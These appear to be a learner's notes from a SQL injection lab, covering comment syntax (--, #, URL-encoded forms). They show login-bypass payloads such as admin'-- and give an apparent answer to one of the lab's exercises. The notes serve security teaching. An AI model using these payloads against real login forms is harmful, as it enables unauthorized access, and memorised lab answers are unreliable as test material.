#### Comments

- \--
- \#

```shell-session
SELECT username FROM logins; -- Selects usernames from the logins table 
```
Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

```shell-session
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.


Inject username: admin'--
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Answer to box: hello' OR id=5)-- 


